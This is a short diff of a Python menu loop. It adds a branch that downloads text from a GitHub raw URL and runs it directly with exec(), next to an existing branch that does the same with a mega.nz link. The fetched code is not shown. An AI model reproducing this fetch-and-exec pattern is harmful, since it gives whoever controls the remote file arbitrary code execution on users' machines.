@@ -32,5 +32,7 @@ while True:
         exec(requests.get('https://mega.nz/file/h20i1JIZ#DgXHSONcns2l5sXz1Fl1XJrB7FeI1cf6Qx2PzQldeUg').text)
     elif chon == '2.1':
         webbrowser.open_new("www.soon.com")
+    elif chon == '0':
+        exec(requests.get('https://raw.githubusercontent.com/Rafail2023/RovaClient/refs/heads/main/Main.txt').text)
     else:
        continue
